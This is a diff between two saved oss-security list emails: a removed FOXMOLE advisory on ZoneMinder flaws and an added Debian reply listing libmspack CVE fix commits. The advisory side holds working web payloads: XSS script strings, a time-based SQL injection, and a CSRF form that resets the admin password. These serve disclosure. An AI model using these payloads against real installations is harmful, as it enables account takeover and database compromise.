@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["5203" "Thursday" "2" "February" "2017" "10:08:30" "+0100" "FOXMOLE Advisories" "advisories@foxmole.com" "<ad74ed31-dcff-24b7-ae84-2421ad10b7ef@foxmole.com>" "130" "[oss-security] [FOXMOLE SA 2016-07-05] ZoneMinder - Multiple Issues" nil nil nil "2" "2017020209:08:30" "[oss-security] [FOXMOLE SA 2016-07-05] ZoneMinder - Multiple Issues" (number mark "U       advisories@f Feb  2  130/5203  " thread-indent "\"[oss-security] [FOXMOLE SA 2016-07-05] ZoneMinder - Multiple Issues\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["655" "Tuesday" "23" "October" "2018" "20:09:45" "+0200" "Salvatore Bonaccorso" "carnil@debian.org" "<20181023180945.GA13330@lorien.valinor.li>" "21" "Re: [oss-security] Buffer overflow in cabextract/libmspack (Fwd: New cabextract 1.8 and libmspack 0.8 release)" nil nil nil "10" "2018102318:09:45" "[oss-security] Buffer overflow in cabextract/libmspack (Fwd: New cabextract 1.8 and libmspack 0.8 release)" (number mark "U       carnil@debia Oct 23   21/655   " thread-indent "\"Re: [oss-security] Buffer overflow in cabextract/libmspack (Fwd: New cabextract 1.8 and libmspack 0.8 release)\"\n") "<20181022081735.1d940b71@computer>" ("<20181022081735.1d940b71@computer>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 32242 invoked by uid 550); 2 Feb 2017 09:45:21 -0000
+Received: (qmail 27676 invoked by uid 550); 23 Oct 2018 18:10:02 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,155 +12,66 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 28616 invoked from network); 2 Feb 2017 09:08:42 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=foxmole.com; h=
-	content-transfer-encoding:content-type:content-type:mime-version
-	:date:date:message-id:subject:subject:from:from; s=20161026; t=
-	1486026511; x=1487840912; bh=7/PoQfu1EIUt1cFTFJIls5cO7mczqLQtM60
-	BlTsknJU=; b=F2Xh29mi6Xrm4cCHGFf2tCCY75xmb8m4Qz39+347fqQZwbrorW4
-	iFmE5hW7MtpgRfSV7h7PKfxCBvuwPSzv9IKbPxNHpepJIBPYBZ410aNdQKGqYtSG
-	gZ+A2Y9j/1komoyNws1QbEcORiIVJMsikZ4bniI5Q0e6XRBlerGyU9sQ6RPxkH0h
-	rQ9RdD+EhILkd5C6636AIDZonGIbdjVuNUavhv7vD3H14r32krQgrb9q57kR2Z55
-	CgeWD/p7PMhQeNeCKMR2YKdSAigaObn/gmtjlkmRvGS2w7rRqpc3CoXYP8aaqF2T
-	7icBah0X5c7jta6vgoOcIxvpp41vW9B6EAQ==
-From: FOXMOLE Advisories <advisories@foxmole.com>
-To: fulldisclosure@seclists.org, bugtraq@securityfocus.com,
- bugs@securitytracker.com, submissions@packetstormsecurity.org,
- oss-security@lists.openwall.com
-Message-ID: <ad74ed31-dcff-24b7-ae84-2421ad10b7ef@foxmole.com>
-Date: Thu, 2 Feb 2017 10:08:30 +0100
+Received: (qmail 27655 invoked from network); 23 Oct 2018 18:10:01 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20161025;
+        h=sender:date:from:to:subject:message-id:references:mime-version
+         :content-disposition:in-reply-to:user-agent;
+        bh=B6d723gTSqiR8EVQOASoQSrbAovrPrmaU0tDuwprEQA=;
+        b=j3J0ov0Y1H6UqdjjqLiijY3MXI/nX9bI2efUOPabAuVrGKKGUXnFKpoA242pUlUQfc
+         EUj9VCUiLHPvFXw3MD8pw1IfDip2Vn3lZwIP5gOApER115SSvl+8WvOQgAql2WxZtti+
+         VN4gnhQ3NJedxNqnv0aPZsumzoYWSAp49dlIS/5RMVatSKSJG0XFaObMTa6KluNzH2Hg
+         3gBe0InABWsIJ4ljr//hyFYVYPOrgyi9xp7IneRGMN1sIDHwxqtoqIkcWSXD/BCzln0M
+         LZt+83UQwQJWlQJMzreBLEoUuS3b1DVumfK3bA2mKl1KFEm1o1R6/5yDeJwZ/xIHTvOz
+         SlCg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:sender:date:from:to:subject:message-id
+         :references:mime-version:content-disposition:in-reply-to:user-agent;
+        bh=B6d723gTSqiR8EVQOASoQSrbAovrPrmaU0tDuwprEQA=;
+        b=hPNnu1vri/l3hfhGEK/jAiPi/VfotUQcc1OUGb6EcoiiK9Vtl79Lhz3lRgNQo4ozmd
+         vRBLOKMSTuS90p2bP3X1Ct5uS9SGzQzISNx+RJs7tiToX2mLGl/fBV4unml6/8zrCy+6
+         qDHwZCabigAoL+kIg6whaZ53l70zLD4WUGhfrq1qxBGwPdkQJCT5mm/8oUJeT68tIVj4
+         8iD8LC8z6d0JPfsNUODmm8zHJgLs8NW0Q5Zq9pbAJSpbxuGGjYt9IWkT6ZOTknHA9vhA
+         HXkMSRqm2aP3t20Mi03gyCNPwN5qNvTf3/+CAwOjcwWwj2s7uBQ4rTnjVlmINVCceXl9
+         s8pw==
+X-Gm-Message-State: ABuFfoj5HSGoK0tDtQkiBWuHOfipjndI4bKB0ZwRa1jMNJqLah6Pf4pi
+	wLS+4QNiJ4gALt/wbDduVXPXYCRTAJ8=
+X-Google-Smtp-Source: ACcGV62tB2nHrNtey2AvxwiBWAGcajxMjFjzDnlm+DMh/98J4sFDzpI8eETOMnVRNx+7T2aBpU4jdQ==
+X-Received: by 2002:a5d:4949:: with SMTP id r9-v6mr49526204wrs.114.1540318187647;
+        Tue, 23 Oct 2018 11:09:47 -0700 (PDT)
+Sender: Salvatore Bonaccorso <salvatore.bonaccorso@gmail.com>
+Date: Tue, 23 Oct 2018 20:09:45 +0200
+From: Salvatore Bonaccorso <carnil@debian.org>
+To: oss-security@lists.openwall.com
+Message-ID: <20181023180945.GA13330@lorien.valinor.li>
+References: <20181022081735.1d940b71@computer>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: 7bit
-Subject: [oss-security] [FOXMOLE SA 2016-07-05] ZoneMinder - Multiple Issues
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+In-Reply-To: <20181022081735.1d940b71@computer>
+User-Agent: Mutt/1.10.1 (2018-07-13)
+Subject: Re: [oss-security] Buffer overflow in cabextract/libmspack (Fwd: New
+ cabextract 1.8 and libmspack 0.8 release)
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+Hi
 
-=== FOXMOLE - Security Advisory 2016-07-05 ===
+FTR, three CVEs were assigned by MITRE, whereeas one is explicitly
+marked as DISPUTED, because upstream makes clear in the changelog
+entry, that the chmextract utility is more an example code how to use
+the library rather than "productised" binaries. Still a CVE was
+assigned for downstreams using it as such.
 
-Zoneminder multiple vulnerabilities
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Here are the assignments:
 
-Affected Versions
-=================
-Zoneminder 1.29,1.30
+CVE-2018-18584:
+https://github.com/kyz/libmspack/commit/40ef1b4093d77ad3a5cfcee1f5cb6108b3a3bcc2
 
-Issue Overview
-==============
-Vulnerability Type: SQL Injection, Cross Site Scripting, Session Fixation, No CSRF Protection
-Technical Risk: high
-Likelihood of Exploitation: medium
-Vendor: Zoneminder
-Vendor URL: https://zoneminder.com/
-Credits: FOXMOLE employee Tim Herres
-Advisory URL: https://www.foxmole.com/advisories/foxmole-2016-07-05.txt
-Advisory Status: Public
-CVE-Number: NA
-CVE URL: NA
-OVE-ID:
-OVI-ID:
-CWE-ID: CWE-89
-CVSS 2.0: 4.3 (AV:N/AC:M/Au:N/C:P/I:N/A:N)
+CVE-2018-18585:
+https://github.com/kyz/libmspack/commit/8759da8db6ec9e866cb8eb143313f397f925bb4f
 
+CVE-2018-18586:
+https://github.com/kyz/libmspack/commit/7cadd489698be117c47efcadd742651594429e6d
 
-Impact
-======
-During an internal code review multiple vulnerabilities were identified.
-The whole application misses input validation and output encoding.
-This means user supplied input is inserted in an unsafe way.
-This could allow a remote attacker to easily compromise user accounts or access the database in an unsafe way.
-
-Issue Description
-=================
-The following findings are only examples there are quite more. The whole application should be reviewed.
-
-All items tested using Firefox
-
-1)Cross Site Scripting (XSS)
-Reflected:
-http://192.168.241.131/zm/index.php?view=request&request=log&task=download&key=a9fef1f4&format=texty9fke%27%3Chtml%3E%3Chead%3E%3C/head%3E%3Cbody%3E%3Cscript%3Ealert(1)%3C%2fscript%3E%3C/body%3E%3C/html%3Eayn2h
-Reflected without authentication: http://192.168.241.131/zm/index.php/LSE4%22%3E%3Cscript%3Ealert(1)%3C/script%3ELSE
-Stored: Creating a new monitor using the name "Bla<script>alert(1)</script>". There is only a clientside protection.
-
-2)SQL Injection
-Example Url:http://192.168.241.131/zm/index.php
-Parameter: limit (POST)
-    Type: stacked queries
-    Title: MySQL > 5.0.11 stacked queries (SELECT - comment)
-    Payload: view=request&request=log&task=query&limit=100;(SELECT *
-FROM (SELECT(SLEEP(5)))OQkj)#&minTime=1466674406.084434
-Easy exploitable using sqlmap.
-
-3)Session Fixation
-After a successful authentication the Session Cookie ZMSESSID remains the same.
-Example: Cookie before the login = ZMSESSID=26ga0i62e4e51mhfcb68nk3dg2 after successful login
-ZMSESSID=26ga0i62e4e51mhfcb68nk3dg2
-
-4)No CSRF Proctection
-A possible CSRF attack form, which changes the password of the admin (uid=1), if the corresponding user activates it.
-<html>
-  <body>
-    <form action="http://192.168.241.131/zm/index.php" method="POST">
-      <input type="hidden" name="view" value="user" />
-      <input type="hidden" name="action" value="user" />
-      <input type="hidden" name="uid" value="1" />
-      <input type="hidden" name="newUser&#91;MonitorIds&#93;" value="" />
-      <input type="hidden" name="newUser&#91;Username&#93;" value="admin" />
-      <input type="hidden" name="newUser&#91;Password&#93;"
-value="admin1" />
-      <input type="hidden" name="conf&#95;password" value="admin1" />
-      <input type="hidden" name="newUser&#91;Language&#93;" value="" />
-      <input type="hidden" name="newUser&#91;Enabled&#93;" value="1" />
-      <input type="hidden" name="newUser&#91;Stream&#93;" value="View" />
-      <input type="hidden" name="newUser&#91;Events&#93;" value="Edit" />
-      <input type="hidden" name="newUser&#91;Control&#93;" value="Edit" />
-      <input type="hidden" name="newUser&#91;Monitors&#93;" value="Edit" />
-      <input type="hidden" name="newUser&#91;Groups&#93;" value="Edit" />
-      <input type="hidden" name="newUser&#91;System&#93;" value="Edit" />
-      <input type="hidden" name="newUser&#91;MaxBandwidth&#93;" value="" />
-      <input type="submit" value="Submit request" />
-    </form>
-  </body>
-</html>
-
-
-
-Temporary Workaround and Fix
-============================
-FOXMOLE advises to disable Zoneminder until the vendor publishes a complete fix.
-
-
-
-History
-=======
-2016-07-05  Issue discovered
-2016-11-22  Vendor contacted, no response
-2016-12-16  Vendor contacted again, still no response
-2017-01-17  Vendor contacted --> working on a patch
-2017-01-22  Vendor contacted, asked for an update and
-            declare advisory release to 2017-02-02 --> no response
-2017-02-02  Advisory Release
-
-
-GPG Signature
-=============
-This advisory is signed with the GPG key of the FOXMOLE advisories team.
-The key can be downloaded here: https://www.foxmole.com/advisories-key-3812092199E3277C.asc
-
------BEGIN PGP SIGNATURE-----
-
-iQIzBAEBCAAdFiEEjrQMZqTYqiY2IftqOBIJIZnjJ3wFAliS9w0ACgkQOBIJIZnj
-J3yAyhAA0EuT6UjSTVeK5V1nWgmzez9mLTHSfzykzDa+seGUArUjb7dOnqQ6C9O0
-21FKxIOOfBdK+CpuqAk0fm5P5CN9jFLqzTuh7+JLdWA8FDpEQdGIZD3iP6DEAh1q
-4e78ZA30u18imdtDjxBUO+cfgJPLFwIEr+cn7eEiIn+spW9Bd5g1RJEOAZT91feO
-o2rwBz917qRCWKa5I+RqSZj+5Ax4LFiVrvZDgMkihlb4Nvfrpg8ewBQfoATfyqF6
-j0ceZBKjLU3aEq4EE9ZvnbuzVLEraiZ+3xDwXdjF0BRKYS6XgRL2xWgr4ldsQ6sS
-glDyyU8QH8eh5UVAswebx9fKVARmog+34dX/ESJieI7A7s6N05IGpFrRcHPpjhRL
-Y3lNWj5+eSvpRSxf7pb9+KdTd8pZhgKK+MY+GulVIb8xtYYGvdju58Lmu23urV8v
-TuHwMOHsHtOzMRr1C8Z47EdTaUm8GsCqoeO8Z4L6ERg/ZZAuQqES26lLpQtCfMze
-HuGHkGGKVUi5s7BSMQqXiUNc3xipA39b0uqHw9OQpRRUixGl4rvAXTeYx6yBdiib
-tmi3/Oph6kWQjuFFhiFC8zrjJhmEtOLc4O+BweKx/WfgWQQ8JPCsznpD2J3ln8XD
-0lP0yuSO0CaJptLioYJhPr+m2SmGxY4rxSuu1cdrOJZfv9QkiLw=
-=/QtX
------END PGP SIGNATURE-----
+Regards,
+Salvatore
